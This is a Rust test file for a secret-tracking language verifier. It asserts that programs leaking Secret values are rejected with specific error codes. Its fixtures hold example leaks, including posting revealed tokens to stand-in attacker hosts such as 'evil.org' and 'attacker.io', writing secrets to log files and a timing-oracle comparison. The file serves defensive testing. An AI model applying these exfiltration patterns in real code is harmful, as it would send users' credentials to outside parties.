use infimum_lang::parser::parse_module;
use infimum_lang::store::GraphStore;
use std::fs;
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};

fn temp_workspace(tag: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = std::env::temp_dir().join(format!("infimum_s3_{tag}_{nanos}"));
    fs::create_dir_all(&dir).unwrap();
    dir
}

#[test]
fn test_blocks_raw_secret_leak_to_audit_log_or_disk() {
    let ws = temp_workspace("raw_leak");
    let store = GraphStore::open(&ws).unwrap();

    let src = r#"
        fn leaky_logger(password: Secret<str>) -[Fs("/tmp/app.log")]-> bool {
          do Fs.write(password);
          true
        }
    "#;
    let m = parse_module(src).unwrap();
    let err = store
        .verify_module(&m)
        .expect_err("raw secret written to Fs must fail");
    assert_eq!(err.code, "E063_RAW_SECRET_SINK_LEAK");

    let _ = fs::remove_dir_all(&ws);
}

#[test]
fn test_blocks_reveal_into_variable_return_or_non_net_sink() {
    let ws = temp_workspace("reveal_escape");
    let store = GraphStore::open(&ws).unwrap();

    // 1. Storing revealed secret in a local `let` variable is forbidden
    let let_escape = r#"
        fn sneak_to_var(tok: Secret<str>) -[Net("api.mybank.com")]-> str {
          let plain = reveal("api.mybank.com", tok);
          plain
        }
    "#;
    let err1 = store
        .verify_module(&parse_module(let_escape).unwrap())
        .expect_err("reveal into local variable must fail");
    assert_eq!(err1.code, "E064_REVEAL_OUTSIDE_NET_SINK");

    // 2. Passing revealed secret into Audit/Fs instead of Net is forbidden
    let audit_escape = r#"
        fn sneak_to_audit(tok: Secret<str>) -[Audit, Net("api.mybank.com")]-> bool {
          do Audit.log(reveal("api.mybank.com", tok));
          true
        }
    "#;
    let err2 = store
        .verify_module(&parse_module(audit_escape).unwrap())
        .expect_err("reveal into Audit must fail");
    assert_eq!(err2.code, "E064_REVEAL_OUTSIDE_NET_SINK");

    let _ = fs::remove_dir_all(&ws);
}

#[test]
fn test_blocks_domain_mismatch_and_wildcard_net_exfiltration() {
    let ws = temp_workspace("domain_pin");
    let store = GraphStore::open(&ws).unwrap();

    // 1. Function holds Net("evil.org"), tries to reveal secret intended for "api.mybank.com"
    let mismatch_src = r#"
        fn wrong_host(tok: Secret<str>) -[Net("evil.org")]-> bool {
          do Net.post(reveal("api.mybank.com", tok));
          true
        }
    "#;
    let err1 = store
        .verify_module(&parse_module(mismatch_src).unwrap())
        .expect_err("mismatched domain must fail");
    assert_eq!(err1.code, "E065_REVEAL_DOMAIN_MISMATCH");

    // 2. Function holds wildcard unpinned `Net` capability
    let wildcard_src = r#"
        fn wildcard_host(tok: Secret<str>) -[Net]-> bool {
          do Net.post(reveal("api.mybank.com", tok));
          true
        }
    "#;
    let err2 = store
        .verify_module(&parse_module(wildcard_src).unwrap())
        .expect_err("wildcard Net must fail secret reveal");
    assert_eq!(err2.code, "E065_REVEAL_DOMAIN_MISMATCH");

    // 3. Function mixes both legitimate and attacker domains in the same node
    let dual_host_src = r#"
        fn dual_host(tok: Secret<str>) -[Net("api.mybank.com"), Net("attacker.io")]-> bool {
          do Net.post(reveal("api.mybank.com", tok));
          true
        }
    "#;
    let err3 = store
        .verify_module(&parse_module(dual_host_src).unwrap())
        .expect_err("multi-domain Net node must not unseal secret");
    assert_eq!(err3.code, "E065_REVEAL_DOMAIN_MISMATCH");

    let _ = fs::remove_dir_all(&ws);
}

#[test]
fn test_blocks_side_channel_secret_comparison_and_contract_inspection() {
    let ws = temp_workspace("side_channel");
    let store = GraphStore::open(&ws).unwrap();

    // 1. Comparing two Secret<i64> values leaks secret bits into control flow!
    let cmp_src = r#"
        fn timing_oracle(pin: Secret<i64>, guess: Secret<i64>) -> bool {
          pin == guess
        }
    "#;
    let err1 = store
        .verify_module(&parse_module(cmp_src).unwrap())
        .expect_err("secret equality comparison must fail");
    assert_eq!(err1.code, "E062_SECRET_OPACITY_VIOLATION");

    // 2. Inspecting Secret<T> inside `req`/`ens` contract is forbidden
    let contract_leak = r#"
        fn pass_through(pin: Secret<i64>) -> Secret<i64>
          ens result == pin
        {
          pin
        }
    "#;
    let err2 = store
        .verify_module(&parse_module(contract_leak).unwrap())
        .expect_err("secret in contract must fail");
    assert_eq!(err2.code, "E062_SECRET_IN_CONTRACT");

    let _ = fs::remove_dir_all(&ws);
}

#[test]
fn test_passport_traces_authorized_secret_pipe_transitively() {
    let ws = temp_workspace("valid_pipe");
    let mut store = GraphStore::open(&ws).unwrap();

    let src = r#"
        fn bank_gateway(api_key: Secret<str>, cents: i64) -[Net("api.stripe.com")]-> bool
          req cents > 0
          ens result == true
        {
          do Net.post(reveal("api.stripe.com", api_key), cents);
          true
        }

        fn charge_customer(key: Secret<str>, dollars: i64) -[Net("api.stripe.com")]-> bool
          req dollars > 0
          ens result == true
        {
          bank_gateway(key, dollars * 100)
        }
    "#;

    let m = parse_module(src).unwrap();
    store.ingest_module(&m).expect("valid pinned secret flow must pass");

    let passport = store.compute_passport("charge_customer").unwrap();
    assert!(passport.uses_secret_types);
    assert_eq!(passport.secret_pipes.len(), 1);
    assert_eq!(passport.secret_pipes[0].secret_type, "Secret<str>");
    assert_eq!(passport.secret_pipes[0].destination_domain, "api.stripe.com");
    assert_eq!(passport.secret_pipes[0].operation, "Net.post");
    assert_eq!(passport.secret_pipes[0].witness_chain.len(), 2);

    let _ = fs::remove_dir_all(&ws);
}
